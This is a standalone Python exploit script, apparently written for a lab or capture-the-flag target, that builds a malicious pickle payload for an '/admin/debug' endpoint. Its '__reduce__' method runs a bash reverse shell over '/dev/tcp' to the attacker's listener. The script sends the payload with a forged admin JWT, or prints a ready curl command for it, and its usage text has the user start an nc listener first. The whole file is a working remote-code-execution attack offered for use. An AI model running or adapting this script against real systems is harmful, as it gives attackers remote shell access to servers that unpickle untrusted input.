#!/usr/bin/env python3
"""
pickle_rce.py - builds a malicious pickle payload for the /admin/debug
endpoint and (optionally) sends it directly.

Requires: a forged admin JWT (see jwt_forge.py) and the target URL.

Usage:
    # Just build the base64 payload:
    python3 pickle_rce.py --lhost 10.10.10.5 --lport 4444 --build-only

    # Build AND send it to the target:
    python3 pickle_rce.py --url http://10.10.10.20:58421/admin/debug \\
        --token "<forged jwt>" --lhost 10.10.10.5 --lport 4444

Start a listener first:
    nc -lvnp 4444
"""
import argparse
import base64
import os
import pickle

try:
    import requests
except ImportError:
    requests = None


class Exploit:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport

    def __reduce__(self):
        cmd = (
            f"bash -c 'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1'"
        )
        return (os.system, (cmd,))


def build_payload(lhost: str, lport: int) -> str:
    raw = pickle.dumps(Exploit(lhost, lport))
    return base64.b64encode(raw).decode()


def main():
    parser = argparse.ArgumentParser(description="Pickle RCE payload for /admin/debug")
    parser.add_argument("--lhost", required=True, help="your listener IP")
    parser.add_argument("--lport", required=True, type=int, help="your listener port")
    parser.add_argument("--url", help="full URL of the /admin/debug endpoint")
    parser.add_argument("--token", help="forged JWT (see jwt_forge.py)")
    parser.add_argument("--build-only", action="store_true",
                         help="just print the payload, don't send it")
    args = parser.parse_args()

    payload_b64 = build_payload(args.lhost, args.lport)
    print(f"[+] Payload (base64 pickle):\n{payload_b64}\n")

    if args.build_only or not args.url:
        print("Send it yourself, e.g.:")
        print(f'  curl -X POST {args.url or "<target-url>"} \\')
        print(f'    -H "Authorization: Bearer {args.token or "<forged jwt>"}" \\')
        print('    -H "Content-Type: application/json" \\')
        print(f'    -d \'{{"report": "{payload_b64}"}}\'')
        return

    if requests is None:
        print("[-] python 'requests' module not installed; use the curl "
              "command above instead, or `pip install requests`.")
        return

    if not args.token:
        print("[-] --token is required to actually send the request.")
        return

    resp = requests.post(
        args.url,
        headers={"Authorization": f"Bearer {args.token}"},
        json={"report": payload_b64},
        timeout=10,
    )
    print(f"[+] Server responded {resp.status_code}: {resp.text}")
    print(f"[+] Check your listener on port {args.lport} for the shell.")


if __name__ == "__main__":
    main()
